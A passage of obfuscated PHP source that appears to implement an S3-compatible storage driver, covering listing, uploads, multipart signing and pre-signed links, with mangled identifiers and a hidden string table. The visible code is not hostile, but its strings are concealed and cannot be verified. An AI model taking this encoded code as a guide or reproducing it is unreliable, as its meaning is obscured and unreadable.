$ó÷ÏùÅÓ; } $ÇÀ¹ØÕã = $this->delByBatch($ª¨ø×ö[$¶ïáÕ[86]]); if (!$ÇÀ¹ØÕã) { return !1; } $ÇÀ¹ØÕã = $this->delByBatch($ª¨ø×ö[$¶ïáÕ[85]]); if (!$ÇÀ¹ØÕã) { return !1; } return $this->delFile($ó÷ÏùÅÓ); } private function delByBatch($÷¾è†»ø) { foreach (array_chunk($÷¾è†»ø, 1000) as $É˜‰™Òß) { $ÁªŒİÜñ = $this->client->deleteObjects($this->bucket, $É˜‰™Òß); if (!$ÁªŒİÜñ) { return !1; } } return !0; } public function rename($·ã§àÛ , $³ğÚ³”) { return $this->renameObject($·ã§àÛ , $³ğÚ³”); } public function listPath($ÏÎ•Úªä, $®µ¦—à¼ = false) { $üÄ‹†¬¼ =& $_SERVER[‘ÆÜ‘œ]; $Åô’“¸„ = $this->fileList($ÏÎ•Úªä, $üÄ‹†¬¼[8], !0); foreach ($Åô’“¸„[$üÄ‹†¬¼[85]] as $ıô’ò => $•²×§¢») { $Åô’“¸„[$üÄ‹†¬¼[85]][$ıô’ò] = $this->folderInfo($•²×§¢», $®µ¦—à¼, $•²×§¢»); } foreach ($Åô’“¸„[$üÄ‹†¬¼[86]] as $ıô’ò => $•²×§¢») { $Åô’“¸„[$üÄ‹†¬¼[86]][$ıô’ò] = $this->fileInfo($•²×§¢»[$üÄ‹†¬¼[32]], $®µ¦—à¼, $•²×§¢»); } return $Åô’“¸„; } protected function infoChildren($€ºÕîÆÇ, &$ä×†çÒá) { $ææ‰Úàã =& $_SERVER[‘ÆÜ‘œ]; $úò‰½à‚ = $this->fileList($€ºÕîÆÇ, $ææ‰Úàã[12], !0); $ä×†çÒá[$ææ‰Úàã[81]] += count($úò‰½à‚[$ææ‰Úàã[85]]); $ä×†çÒá[$ææ‰Úàã[80]] += count($úò‰½à‚[$ææ‰Úàã[86]]); foreach ($úò‰½à‚[$ææ‰Úàã[86]] as $·ŠÇ§î¼) { if (!$·ŠÇ§î¼ || !$·ŠÇ§î¼[$ææ‰Úàã[79]]) { continue; } $ä×†çÒá[$ææ‰Úàã[79]] += $·ŠÇ§î¼[$ææ‰Úàã[79]]; } } private function fileInfo($ŒÖ¸ô¼Ù, $¿úïƒ¦Â = false, $µâÕ— = array()) { $´˜¢ü£‘ =& $_SERVER[‘ÆÜ‘œ]; $²Øìò›Õ = array($´˜¢ü£‘[32] => $this->pathThis($ŒÖ¸ô¼Ù), $´˜¢ü£‘[87] => $this->getPathOuter($ŒÖ¸ô¼Ù), $´˜¢ü£‘[33] => $´˜¢ü£‘[231], $´˜¢ü£‘[167] => $this->ext($ŒÖ¸ô¼Ù), $´˜¢ü£‘[79] => isset($µâÕ—[$´˜¢ü£‘[79]]) ? $µâÕ—[$´˜¢ü£‘[79]] : 0); if ($¿úïƒ¦Â) { return $²Øìò›Õ; } $²Øìò›Õ[$´˜¢ü£‘[232]] = $²Øìò›Õ[$´˜¢ü£‘[88]] = 0; $²Øìò›Õ[$´˜¢ü£‘[233]] = $²Øìò›Õ[$´˜¢ü£‘[234]] = !0; if (empty($µâÕ—)) { $µâÕ— = $this->objectMeta($ŒÖ¸ô¼Ù); if (!$µâÕ—) { return $²Øìò›Õ; } } if (isset($µâÕ—[$´˜¢ü£‘[235]]) && $µâÕ—[$´˜¢ü£‘[235]]) { $²Øìò›Õ[$´˜¢ü£‘[236]] = $µâÕ—[$´˜¢ü£‘[235]]; } if (isset($µâÕ—[$´˜¢ü£‘[205]])) { $²Øìò›Õ[$´˜¢ü£‘[88]] = $µâÕ—[$´˜¢ü£‘[205]]; } if (isset($µâÕ—[$´˜¢ü£‘[79]])) { $²Øìò›Õ[$´˜¢ü£‘[79]] = $µâÕ—[$´˜¢ü£‘[79]]; } return $²Øìò›Õ; } private function folderInfo($Œİìµî, $Ä…’œ˜í = false, $¤…ÓÅ¸É = array()) { $ˆÖëÓı› =& $_SERVER[‘ÆÜ‘œ]; $€ŠœÀ„ê = array($ˆÖëÓı›[32] => $this->pathThis($Œİìµî), $ˆÖëÓı›[87] => $this->getPathOuter($ˆÖëÓı›[8] . $Œİìµî), $ˆÖëÓı›[33] => $ˆÖëÓı›[78]); if ($Ä…’œ˜í) { return $€ŠœÀ„ê; } $€ŠœÀ„ê[$ˆÖëÓı›[232]] = $€ŠœÀ„ê[$ˆÖëÓı›[88]] = 0; $€ŠœÀ„ê[$ˆÖëÓı›[233]] = $€ŠœÀ„ê[$ˆÖëÓı›[234]] = !0; if ($Œİìµî == $ˆÖëÓı›[12]) { return $€ŠœÀ„ê; } if (empty($¤…ÓÅ¸É)) { $¤…ÓÅ¸É = $this->objectMeta(trim($Œİìµî, $ˆÖëÓı›[8]) . $ˆÖëÓı›[8]); } if (isset($¤…ÓÅ¸É[$ˆÖëÓı›[205]])) { $€ŠœÀ„ê[$ˆÖëÓı›[232]] = $¤…ÓÅ¸É[$ˆÖëÓı›[205]]; } return $€ŠœÀ„ê; } private function fileList($ä­ğÒœ‚, $©ı¾í¨Ò = '', $å×ÂÛø = 0) { $ì¶ó£ÙÜ =& $_SERVER[‘ÆÜ‘œ]; $¯³–‘‘ó = rtrim($ä­ğÒœ‚, $ì¶ó£ÙÜ[8]) . $ì¶ó£ÙÜ[8]; $×¡ù¾ì = $this->listObjs($¯³–‘‘ó, null, null, $©ı¾í¨Ò); if (!$×¡ù¾ì) { return array($ì¶ó£ÙÜ[85] => array(), $ì¶ó£ÙÜ[86] => array()); } $²åáƒ ´ = $—”Ï¿îÈ = array(); foreach ($×¡ù¾ì[$ì¶ó£ÙÜ[237]] as $ï¤´‹ºØ) { $ÇêÇš¿Ñ = $ï¤´‹ºØ[$ì¶ó£ÙÜ[32]]; if ($ÇêÇš¿Ñ == $¯³–‘‘ó) { continue; } $ğë°€ÚÛ = isset($ï¤´‹ºØ[$ì¶ó£ÙÜ[79]]) ? $ï¤´‹ºØ[$ì¶ó£ÙÜ[79]] : 0; $ïÜ„»Åœ = $ğë°€ÚÛ == 0 && substr($ÇêÇš¿Ñ, strlen($ÇêÇš¿Ñ) - 1, 1) == $ì¶ó£ÙÜ[8] ? !0 : !1; $this->cacheMethodInfoSet($ÇêÇš¿Ñ, $ïÜ„»Åœ, $ï¤´‹ºØ); if ($ïÜ„»Åœ) { $²åáƒ ´[] = $ÇêÇš¿Ñ; continue; } $—”Ï¿îÈ[] = $å×ÂÛø ? $ï¤´‹ºØ : $ÇêÇš¿Ñ; } foreach ($×¡ù¾ì[$ì¶ó£ÙÜ[238]] as $ï¤´‹ºØ) { $²åáƒ ´[] = $ï¤´‹ºØ[$ì¶ó£ÙÜ[32]]; $this->cacheMethodInfoSet($ï¤´‹ºØ[$ì¶ó£ÙÜ[32]], !0); } $this->cacheMethodInfoSet($ä­ğÒœ‚, !0); return array($ì¶ó£ÙÜ[85] => $²åáƒ ´, $ì¶ó£ÙÜ[86] => $—”Ï¿îÈ); } private function listObjs($Ä†ı–•É, $É‘Š¾¶ = null, $ş¯ûÜô = null, $ÓäÊè² = null) { $ÅÕãáÒ =& $_SERVER[‘ÆÜ‘œ]; $Ä†ı–•É = trim($Ä†ı–•É, $ÅÕãáÒ[8]); $“íì¸Íå = empty($Ä†ı–•É) && $Ä†ı–•É !== $ÅÕãáÒ[229] ? $ÅÕãáÒ[12] : $Ä†ı–•É . $ÅÕãáÒ[8]; return $this->client->getBucket($this->bucket, $“íì¸Íå, $É‘Š¾¶, $ş¯ûÜô, $ÓäÊè², !0); } public function has($Åõ÷ÉÊ, $—Í§‚ğ‰ = false, $îÎˆìû = true) { $ÙÅ»Ãñã =& $_SERVER[‘ÆÜ‘œ]; $Åõ÷ÉÊ = trim($Åõ÷ÉÊ, $ÙÅ»Ãñã[8]); $ØşôßÙ = empty($Åõ÷ÉÊ) && $Åõ÷ÉÊ !== $ÙÅ»Ãñã[229] ? $ÙÅ»Ãñã[12] : $Åõ÷ÉÊ . $ÙÅ»Ãñã[8]; $¥‚‘–é× = null; $‰•æÜî = 500; $š¨è¶„Ì = $ÙÅ»Ãñã[8]; $ÚÀ®‚­ò = $õîëèö = array(); while (!0) { $â¹•€­ = $this->listObjs($Åõ÷ÉÊ, $¥‚‘–é×, $‰•æÜî, $š¨è¶„Ì); if (!$â¹•€­) { break; } $¥‚‘–é× = $â¹•€­[$ÙÅ»Ãñã[239]]; $°œíó—µ = $â¹•€­[$ÙÅ»Ãñã[237]]; $àÄÛó³ = $â¹•€­[$ÙÅ»Ãñã[238]]; if (empty($°œíó—µ) && empty($àÄÛó³)) { break; } if (count($°œíó—µ) == 1 && $°œíó—µ[0][$ÙÅ»Ãñã[32]] == $ØşôßÙ) { break; } if ($—Í§‚ğ‰) { if (count($°œíó—µ)) { $°œíó—µ = array_column($°œíó—µ, $ÙÅ»Ãñã[32]); $ÚÀ®‚­ò = array_merge($ÚÀ®‚­ò, $°œíó—µ); } if (count($àÄÛó³)) { $àÄÛó³ = array_column($àÄÛó³, $ÙÅ»Ãñã[32]); $õîëèö = array_merge($õîëèö, $àÄÛó³); } if ($¥‚‘–é× === null) { break; } continue; } if ($îÎˆìû) { if (!empty($°œíó—µ)) { if (count($°œíó—µ) > 1 || isset($°œíó—µ[0][$ÙÅ»Ãñã[32]]) && $°œíó—µ[0][$ÙÅ»Ãñã[32]] != $ØşôßÙ) { return !0; } } } else { if (!empty($àÄÛó³)) { return !0; } } if ($¥‚‘–é× === null) { break; } } if ($—Í§‚ğ‰) { $ÚÀ®‚­ò = array_diff($ÚÀ®‚­ò, array($ØşôßÙ)); $ÚÀ®‚­ò = count(array_unique($ÚÀ®‚­ò)); $õîëèö = count(array_unique($õîëèö)); return array($ÙÅ»Ãñã[240] => $ÚÀ®‚­ò, $ÙÅ»Ãñã[241] => $õîëèö); } return !1; } public function listAll($±ÍÖİ©ç) { $›§ßõª½ =& $_SERVER[‘ÆÜ‘œ]; $‚Šàé«ü = $this->fileList($±ÍÖİ©ç, $›§ßõª½[12], !0); $İ«ÂÄ¦ = array_to_keyvalue($‚Šàé«ü[$›§ßõª½[86]], $›§ßõª½[32]); foreach ($‚Šàé«ü[$›§ßõª½[85]] as $ú¾áæÍ‰) { if (is_string($ú¾áæÍ‰)) { $İ«ÂÄ¦[$ú¾áæÍ‰] = array($›§ßõª½[79] => 0); } } return $this->listAllFiles($±ÍÖİ©ç, $İ«ÂÄ¦); } public function canRead($ã«œ—Ö) { $é¶ŸÁü =& $_SERVER[‘ÆÜ‘œ]; $İ‰°úÊë = $this->client->getAccessControlPolicy($this->bucket, $ã«œ—Ö); if (!$İ‰°úÊë) { return !1; } return in_array($İ‰°úÊë, array($é¶ŸÁü[242], $é¶ŸÁü[243], $é¶ŸÁü[244])) ? !0 : !1; } public function canWrite($×¢â¥”) { $óÂÓùø» =& $_SERVER[‘ÆÜ‘œ]; $à”Œˆ›½ = $this->client->getAccessControlPolicy($this->bucket, $×¢â¥”); if (!$à”Œˆ›½) { return !1; } return in_array($à”Œˆ›½, array($óÂÓùø»[242], $óÂÓùø»[243])) ? !0 : !1; } public function getContent($®ê‰¦…ˆ) { return $this->client->getObject($this->bucket, $®ê‰¦…ˆ); } public function setContent($›Ú’¼Ä, $“Á²İş = '', $ØÏå”öì = false) { $–Ê¡ü­ =& $_SERVER[‘ÆÜ‘œ]; $›Ú’¼Ä = $ØÏå”öì ? trim($›Ú’¼Ä, $–Ê¡ü­[8]) . $–Ê¡ü­[8] : $›Ú’¼Ä; $í ö¶ÌŠ = get_file_mime(get_path_ext($›Ú’¼Ä)); $†Ûä˜Ç = $this->client->putObject($“Á²İş, $this->bucket, $›Ú’¼Ä, $–Ê¡ü­[230], array(), $í ö¶ÌŠ); if (!$†Ûä˜Ç) { return !1; } if ($ØÏå”öì) { return !0; } return $†Ûä˜Ç ? !0 : !1; } public function fileSubstr($ë¶Ó»Èø, $˜§„•’õ, $ £¶) { $——ƒà®Ş = $˜§„•’õ + $ £¶ - 1; return $this->client->getObject($this->bucket, $ë¶Ó»Èø, array($_SERVER[‘ÆÜ‘œ][245] => "\142\x79\164\x65\163\75{$˜§„•’õ}\x2d{$——ƒà®Ş}")); } public function upload($“ÛòŠš, $ƒñğ÷¥Ì, $ò¨à« = false, $µäÖ©†¬ = REPEAT_REPLACE) { $åéÉ´« =& $_SERVER[‘ÆÜ‘œ]; if (!$ƒñğ÷¥Ì || !@file_exists($ƒñğ÷¥Ì)) { return !1; } $¤ô†×ù† = array($åéÉ´«[246] => @md5_file($ƒñğ÷¥Ì)); $Øûşœªİ = array($åéÉ´«[247] => get_file_mime(get_path_ext($“ÛòŠš))); if (IO::size($ƒñğ÷¥Ì) <= 1024 * 1024 * 200) { $«±€Èø¢ = $this->client->putObjectFile($ƒñğ÷¥Ì, $this->bucket, $“ÛòŠš, $åéÉ´«[230], $¤ô†×ù†, $Øûşœªİ); return !empty($«±€Èø¢) ? $this->getPathOuter($“ÛòŠš) : !1; } $ÒÖüšÑ = $this->client->multiUploadObject($ƒñğ÷¥Ì, $this->bucket, trim($“ÛòŠš, $åéÉ´«[8]), $¤ô†×ù†, $Øûşœªİ); return $ÒÖüšÑ ? $this->getPathOuter($“ÛòŠš) : !1; } public function download($İöÆôÚµ, $Ğôïëáä) { if (!@is_dir($this->pathFather($Ğôïëáä)) && !IO::mkdir($this->pathFather($Ğôïëáä))) { return !1; } $¸¸Æ«¹™ = $this->client->getObject($this->bucket, $İöÆôÚµ, array(), $Ğôïëáä); return $¸¸Æ«¹™ !== !1 ? $Ğôïëáä : !1; } public function link($Îô­´Ó, $åøĞ›’ˆ = array()) { return $this->getPreSignedURL($Îô­´Ó, 3600 * 12, $åøĞ›’ˆ); } private function getPreSignedURL($Îñ³”ƒ¸, $ú—Ùü¥¸, $‚§È‰“à = array(), $‰Ÿ¾¶ü” = "\107\105\x54") { $êÃ†ğóÄ =& $_SERVER[‘ÆÜ‘œ]; $Îñ³”ƒ¸ = trim($Îñ³”ƒ¸, $êÃ†ğóÄ[8]); if ($this->signVer == $êÃ†ğóÄ[248]) { return $this->client->getPreSignedV2URL($this->bucket, $Îñ³”ƒ¸, $ú—Ùü¥¸, $‰Ÿ¾¶ü”, $‚§È‰“à); } return $this->client->getPreSignedV4URL($this->bucket, $Îñ³”ƒ¸, $ú—Ùü¥¸, array(), $‰Ÿ¾¶ü”, $‚§È‰“à); } public function fileOut($ììú¿, $Áòû“åí = false, $¨±òú = false, $ù‹è¯ê÷ = '') { $Óä€óµı =& $_SERVER[‘ÆÜ‘œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ììú¿, $Áòû“åí, $¨±òú, $ù‹è¯ê÷); } if (!$¨±òú) { $¨±òú = $this->pathThis($ììú¿); } $ñ°æØ¦Ì = get_file_mime(get_path_ext($¨±òú)); if ($ñ°æØ¦Ì == $Óä€óµı[249]) { return parent::fileOut($ììú¿, $Áòû“åí, $¨±òú, $ù‹è¯ê÷); } $µÙ ÆÌı = array($Óä€óµı[250] => $ñ°æØ¦Ì); if ($Áòû“åí) { $µÙ ÆÌı[$Óä€óµı[251]] = $Óä€óµı[252] . rawurlencode($¨±òú); } else { } $æê¸Ø²¦ = $this->link($ììú¿, $µÙ ÆÌı); $this->fileOutLink($æê¸Ø²¦); } public function fileOutServer($©êÓÏÒ, $Ú¡ÆõèÓ = false, $´ßıŸƒ = false, $êá­£ = '') { parent::fileOut($©êÓÏÒ, $Ú¡ÆõèÓ, $´ßıŸƒ, $êá­£); } public function fileOutImageServer($ë‚Í²±“, $¶ª©Š‹© = 250) { parent::fileOutImage($ë‚Í²±“, $¶ª©Š‹©); } public function fileOutLink($ç·ãèœ¢) { $Õºİşİ¶ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Õºİşİ¶[67], $Õºİşİ¶[66], $Õºİşİ¶[68])) && !get_url_scheme($this->endpoint) && substr($ç·ãèœ¢, 0, 7) == $Õºİşİ¶[217]) { $ç·ãèœ¢ = $Õºİşİ¶[218] . substr($ç·ãèœ¢, 7); } header($Õºİşİ¶[173] . $ç·ãèœ¢); die; } public function hashMd5($´¡‘·ü“, $†í›İˆû = '') { $†¨óªÊ = $this->objectMeta($´¡‘·ü“); if (!$†¨óªÊ) { return !1; } $†í›İˆû = $†í›İˆû ? $†í›İˆû : _get($†¨óªÊ, $_SERVER[‘ÆÜ‘œ][253]); return $†í›İˆû; } public function uploadFormData($Õƒ×ÜëË, $çñÊÏî = 3600) { $¿éêØ¥¿ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->_isClientAsync()) { $ìÔİµ• = $this->getPreSignedURL($Õƒ×ÜëË, $çñÊÏî, array(), $¿éêØ¥¿[254]); return array($¿éêØ¥¿[207] => str_replace($¿éêØ¥¿[217], $¿éêØ¥¿[255], $ìÔİµ•)); } if (isset($GLOBALS[$¿éêØ¥¿[6]][$¿éêØ¥¿[92]][$¿éêØ¥¿[256]]) && $GLOBALS[$¿éêØ¥¿[6]][$¿éêØ¥¿[92]][$¿éêØ¥¿[256]] == $¿éêØ¥¿[229]) { return $this->uploadMultiData($Õƒ×ÜëË, $çñÊÏî); } if ($this->signVer == $¿éêØ¥¿[248]) { return $this->uploadFormDataV2($Õƒ×ÜëË, $çñÊÏî); } return $this->uploadFormDataV4($Õƒ×ÜëË, $çñÊÏî); } public function uploadFormDataV2($ãÅ³†å‰, $ šËœÛñ = 3600) { $Ò‰Ü÷¨ª =& $_SERVER[‘ÆÜ‘œ]; $ £–Ï„ = $this->pathFather($ãÅ³†å‰); $Ñë¬®›Ö = $this->client->getHttpUploadPostParams($this->bucket, $ £–Ï„, $Ò‰Ü÷¨ª[230], $ šËœÛñ); $üìŠşîÙ = array_merge((array) $Ñë¬®›Ö, array($Ò‰Ü÷¨ª[257] => $Ò‰Ü÷¨ª[248], $Ò‰Ü÷¨ª[207] => $this->getHost())); if ($this->_isClientAsync()) { unset($üìŠşîÙ[$Ò‰Ü÷¨ª[257]]); } return $üìŠşîÙ; } public function uploadFormDataV4($Ç»’âÒß, $ƒ¹´›ÁÈ = 3600) { $»áÕĞìß =& $_SERVER[‘ÆÜ‘œ]; $±ÚøÄ‡ò = $»áÕĞìß[230]; $Æ’¤¾å = $»áÕĞìß[258]; $äİ¿¡¼Ş = $»áÕĞìß[62]; $¶ÁÆÚ´Â = gmdate($»áÕĞìß[259]); $íÔ•¶¿ = gmdate($»áÕĞìß[260]); $óÙÖ†ë = $»áÕĞìß[261]; $ı†öæş‡ = $ƒ¹´›ÁÈ . $»áÕĞìß[12]; $¦×½Ñ˜µ = $»áÕĞìß[262]; $ÚÓÖƒŠ‹ = array($this->accessKey, $íÔ•¶¿, $this->region, $äİ¿¡¼Ş, $óÙÖ†ë); $ÈÎŞ‡É¼ = implode($»áÕĞìß[8], $ÚÓÖƒŠ‹); $ùüÑ±´Â = array($»áÕĞìß[263] => gmdate($»áÕĞìß[264], strtotime($»áÕĞìß[265])), $»áÕĞìß[266] => array(array($»áÕĞìß[267] => $this->bucket), array($»áÕĞìß[268], $»áÕĞìß[269], $»áÕĞìß[12]), array($»áÕĞìß[268], $»áÕĞìß[270], $»áÕĞìß[12]), array($»áÕĞìß[271] => $¦×½Ñ˜µ), array($»áÕĞìß[272] => $ÈÎŞ‡É¼), array($»áÕĞìß[273] => $Æ’¤¾å), array($»áÕĞìß[274] => $¶ÁÆÚ´Â), array($»áÕĞìß[275] => $ı†öæş‡))); $õØ”‹Ú÷ = base64_encode(json_encode($ùüÑ±´Â)); $‚Ş¦ùğ” = hash_hmac($»áÕĞìß[276], $íÔ•¶¿, $»áÕĞìß[277] . $this->secret, !0); $œƒÔÈœ = hash_hmac($»áÕĞìß[276], $this->region, $‚Ş¦ùğ”, !0); $é•úîÖÄ = hash_hmac($»áÕĞìß[276], $äİ¿¡¼Ş, $œƒÔÈœ, !0); $Çª¡àÈ = hash_hmac($»áÕĞìß[276], $óÙÖ†ë, $é•úîÖÄ, !0); $‘“û¯î = hash_hmac($»áÕĞìß[276], $õØ”‹Ú÷, $Çª¡àÈ); $ÃëÊªŠÈ = array($»áÕĞìß[247] => $»áÕĞìß[12], $»áÕĞìß[271] => $¦×½Ñ˜µ, $»áÕĞìß[278] => $õØ”‹Ú÷, $»áÕĞìß[272] => $ÈÎŞ‡É¼, $»áÕĞìß[273] => $Æ’¤¾å, $»áÕĞìß[274] => $¶ÁÆÚ´Â, $»áÕĞìß[275] => $ı†öæş‡, $»áÕĞìß[279] => $‘“û¯î, $»áÕĞìß[257] => $»áÕĞìß[248], $»áÕĞìß[207] => $this->getHost()); if ($this->_isClientAsync()) { unset($ÃëÊªŠÈ[$»áÕĞìß[257]]); } return $ÃëÊªŠÈ; } public function uploadMultiData($ØÎ‡Åâ, $è¾®¦â = 3600) { $²îş’ İ =& $_SERVER[‘ÆÜ‘œ]; $·ôÕâ… = $this->signVer == $²îş’ İ[248] ? gmdate($²îş’ İ[280]) : gmdate($²îş’ İ[281]); $÷Æ„½û = array(); $ŠºèöÄ = $this->client->getUploadId($this->bucket, $ØÎ‡Åâ, $÷Æ„½û); if (!$ŠºèöÄ) { return !1; } $ŠëÒºÏï = array($²îş’ İ[282] => $ŠºèöÄ, $²îş’ İ[207] => $this->getHost() . $²îş’ İ[8] . $this->pathEncode($ØÎ‡Åâ), $²îş’ İ[283] => $·ôÕâ…, $²îş’ İ[95] => $ØÎ‡Åâ, $²îş’ İ[257] => $this->signVer); if ($this->_isClientAsync()) { unset($ŠëÒºÏï[$²îş’ İ[257]]); } return $ŠëÒºÏï; } public function uploadMultiAuth($áğ‹à Í, $©‹³è± = array()) { $‘¸¯¸‰ =& $_SERVER[‘ÆÜ‘œ]; if ($this->signVer == $‘¸¯¸‰[248]) { if (isset($©‹³è±[$‘¸¯¸‰[284]])) { return $this->uploadPartAuthV2($áğ‹à Í, $©‹³è±); } return $this->uploadListAuthV2($áğ‹à Í, $©‹³è±); } if (isset($©‹³è±[$‘¸¯¸‰[284]])) { return $this->uploadPartAuthV4($áğ‹à Í, $©‹³è±); } return $this->uploadListAuthV4($áğ‹à Í, $©‹³è±); } public function uploadPartAuthV2($ÆËÉíö†, $·—ñêÌ¨ = array()) { $òœÖöàĞ =& $_SERVER[‘ÆÜ‘œ]; $Ğ†èî˜• = $·—ñêÌ¨[$òœÖöàĞ[95]]; $©†Å……’ = gmdate($òœÖöàĞ[280]); $êäØ•ø = array_intersect_key($·—ñêÌ¨, array_flip(array($òœÖöàĞ[284], $òœÖöàĞ[282]))); ksort($êäØ•ø); $ó¼´Œõ = $êäØ•ø ? $òœÖöàĞ[76] . http_build_query($êäØ•ø, null, $òœÖöàĞ[285], PHP_QUERY_RFC3986) : $òœÖöàĞ[12]; $Ô½šÓ„„ = array($òœÖöàĞ[254], $òœÖöàĞ[12], $òœÖöàĞ[121], $òœÖöàĞ[12], "\170\x2d\141\x6d\172\x2d\x64\141\164\x65\72{$©†Å……’}", $òœÖöàĞ[8] . $this->bucket . $òœÖöàĞ[8] . $this->pathEncode($Ğ†èî˜•) . $ó¼´Œõ); $¯°öÜ°‹ = implode($òœÖöàĞ[286], $Ô½šÓ„„); $ë¨˜§Á· = $this->client->__getSignature($¯°öÜ°‹); return array($òœÖöàĞ[287] => $ë¨˜§Á·, $òœÖöàĞ[283] => $©†Å……’); } public function uploadListAuthV2($ã²Ûô, $„×£â…Â = array()) { $ÛáòÛ”­ =& $_SERVER[‘ÆÜ‘œ]; $œ¶³éµ = $„×£â…Â[$ÛáòÛ”­[95]]; $¨®üÀÙè = $„×£â…Â[$ÛáòÛ”­[282]]; $Êö‚ÂŸê = $this->client->listParts($this->bucket, $œ¶³éµ, $¨®üÀÙè); if (!$Êö‚ÂŸê) { return !1; } $ÎÀúÀ€ = gmdate($ÛáòÛ”­[280]); $ÇÖÛ°˜Ê = $ÛáòÛ”­[288] . $¨®üÀÙè; $Õ£ï»ò = array($ÛáòÛ”­[289], $ÛáòÛ”­[12], $ÛáòÛ”­[121], $ÛáòÛ”­[12], "\170\x2d\x61\155\x7a\x2d\x64\141\164\145\72{$ÎÀúÀ€}", $ÛáòÛ”­[8] . $this->bucket . $ÛáòÛ”­[8] . $this->pathEncode($œ¶³éµ) . $ÇÖÛ°˜Ê); $¢…–ù—  = implode($ÛáòÛ”­[286], $Õ£ï»ò); $ÜŠØ´’Ô = $this->client->__getSignature($¢…–ù— ); return array($ÛáòÛ”­[287] => $ÜŠØ´’Ô, $ÛáòÛ”­[283] => $ÎÀúÀ€, $ÛáòÛ”­[290] => $Êö‚ÂŸê); } public function uploadPartAuthV4($ˆßÔøšü, $Á‰Õ‰éê = array()) { $İßÜÒÄú =& $_SERVER[‘ÆÜ‘œ]; $÷ë´‡ûË = $Á‰Õ‰éê[$İßÜÒÄú[95]]; $í­€«å£ = array($İßÜÒÄú[274] => gmdate($İßÜÒÄú[281]), $İßÜÒÄú[291] => _get($Á‰Õ‰éê, $İßÜÒÄú[292], hash($İßÜÒÄú[276], $İßÜÒÄú[12]))); $êåâ†¿ = explode($İßÜÒÄú[209], $this->getHost()); $É²âäíò = array($İßÜÒÄú[293] => $êåâ†¿[1], $İßÜÒÄú[294] => $İßÜÒÄú[12], $İßÜÒÄú[247] => $İßÜÒÄú[121], $İßÜÒÄú[295] => $Á‰Õ‰éê[$İßÜÒÄú[79]]); $ŒÙÈ™é = $İßÜÒÄú[254]; $ôãúÛ© = $İßÜÒÄú[8] . $this->pathEncode($÷ë´‡ûË); $†—ş¡Ùà = array_intersect_key($Á‰Õ‰éê, array_flip(array($İßÜÒÄú[284], $İßÜÒÄú[282]))); $Œğ‘Ö­Ú = $this->client->__getSignatureV4($í­€«å£, $É²âäíò, $ŒÙÈ™é, $ôãúÛ©, $†—ş¡Ùà); return array($İßÜÒÄú[287] => $Œğ‘Ö­Ú, $İßÜÒÄú[291] => $í­€«å£[$İßÜÒÄú[291]], $İßÜÒÄú[283] => $í­€«å£[$İßÜÒÄú[274]]); } public function uploadListAuthV4($áô°ÁíÒ, $‡†åØ€ = array()) { $â¾…‹ô½ =& $_SERVER[‘ÆÜ‘œ]; $–¡½…¸¼ = $‡†åØ€[$â¾…‹ô½[95]]; $öéäîØ = $‡†åØ€[$â¾…‹ô½[282]]; $æ¢õÙ±÷ = $this->client->listParts($this->bucket, $–¡½…¸¼, $öéäîØ); if (!$æ¢õÙ±÷) { return !1; } $ø’…ã¢ä = $â¾…‹ô½[296]; foreach ($æ¢õÙ±÷ as $Èç‹ªæ“) { $ø’…ã¢ä .= $â¾…‹ô½[297] . "\x3c\120\141\162\164\x4e\165\155\x62\x65\x72\76{$Èç‹ªæ“[$â¾…‹ô½[298]]}\x3c\57\x50\141\162\164\116\x75\155\x62\x65\x72\76\12" . "\74\105\x54\x61\147\x3e{$Èç‹ªæ“[$â¾…‹ô½[299]]}\x3c\x2f\x45\124\141\x67\x3e\12" . $â¾…‹ô½[300]; } $ø’…ã¢ä .= $â¾…‹ô½[301]; $¾é³ôµü = array($â¾…‹ô½[274] => gmdate($â¾…‹ô½[281]), $â¾…‹ô½[291] => hash($â¾…‹ô½[276], $ø’…ã¢ä)); $™’úâ‰ = explode($â¾…‹ô½[209], $this->getHost()); $«èÉ·å = array($â¾…‹ô½[293] => $™’úâ‰[1], $â¾…‹ô½[247] => $â¾…‹ô½[121], $â¾…‹ô½[295] => strlen($ø’…ã¢ä)); $ó¨¥ØÖœ = $â¾…‹ô½[289]; $¦¡ü±¬ = $â¾…‹ô½[8] . $this->pathEncode($–¡½…¸¼); $Ï©ÃêÖ¤ = array($â¾…‹ô½[282] => $öéäîØ); $–Êàóœö = $this->client->__getSignatureV4($¾é³ôµü, $«èÉ·å, $ó¨¥ØÖœ, $¦¡ü±¬, $Ï©ÃêÖ¤); return array($â¾…‹ô½[287] => $–Êàóœö, $â¾…‹ô½[291] => $¾é³ôµü[$â¾…‹ô½[291]], $â¾…‹ô½[283] => $¾é³ôµü[$â¾…‹ô½[274]], $â¾…‹ô½[290] => $æ¢õÙ±÷); } private function _isClientAsync() { $÷ÑİÛš =& $_SERVER[‘ÆÜ‘œ]; static $ññ²æ¯ = null; if ($ññ²æ¯ === null) { $ªÌÌ†¨– = isset($_REQUEST[$÷ÑİÛš[302]]) ? json_decode($_REQUEST[$÷ÑİÛš[302]], !0) : !1; $ññ²æ¯ = $ªÌÌ†¨– && _get($ªÌÌ†¨–, $÷ÑİÛš[303]) == $÷ÑİÛš[304]; } return $ññ²æ¯; } public function getHost() { $¬à±Ì¬ =& $_SERVER[‘ÆÜ‘œ]; $¢–¾¯¡¾ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¬à±Ì¬[70], $¬à±Ì¬[64], $¬à±Ì¬[69], $¬à±Ì¬[62]))) { return $¢–¾¯¡¾ . $¬à±Ì¬[8] . $this->bucket; } if ($this->osType == $¬à±Ì¬[62] && !is_domain($¢–¾¯¡¾)) { return $¢–¾¯¡¾ . $¬à±Ì¬[8] . $this->bucket; } $¢–¾¯¡¾ = explode($¬à±Ì¬[209], $¢–¾¯¡¾); return $¢–¾¯¡¾[0] . $¬à±Ì¬[209] . $this->bucket . $¬à±Ì¬[10] . $¢–¾¯¡¾[1]; } public function size($òº—˜¢¿) { $àş­²Ÿ = $this->objectMeta($òº—˜¢¿); return $àş­²Ÿ ? $àş­²Ÿ[$_SERVER[‘ÆÜ‘œ][79]] : 0; } public function info($µ“çóíƒ) { if ($this->isFolder($µ“çóíƒ)) { return $this->folderInfo($µ“çóíƒ); } else { if ($this->isFile($µ“çóíƒ)) { return $this->fileInfo($µ“çóíƒ); } } return !1; } public function exist($÷§†»€¦) { return $this->isFile($÷§†»€¦) || 